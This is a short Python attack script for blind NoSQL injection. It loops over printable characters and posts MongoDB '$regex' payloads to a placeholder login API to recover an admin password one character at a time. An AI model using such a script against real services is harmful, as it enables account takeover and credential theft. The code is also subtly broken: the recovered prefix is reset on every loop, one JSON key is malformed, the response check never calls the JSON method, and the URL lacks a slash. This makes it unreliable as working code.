import requests
import string

# post request with payload adding a character to leaked data every loop
# checking if post request includes logged in and if it does break loop

url = "http://target.com"
headers = {"content-type": "application/json"}

while True:
    leaked_data = ["johnsnow["]
    for character in string.printable:
        if character not in ["*", "+", ".", "?", "|", '"', "\\"]:

            print(f"trying {''.join(leaked_data) + character}")

            payload = ('{"username": {"$eq:"admin"}, "password" : {"$regex":"^%s" }}'
                       % (''.join(leaked_data) + character))

            r = requests.post(url + "api/login", data=payload, headers=headers)
            if r.json == {"Logged":1,
                          "message":"Logged in successfully"
            }:
                leaked_data.append(character)
                break
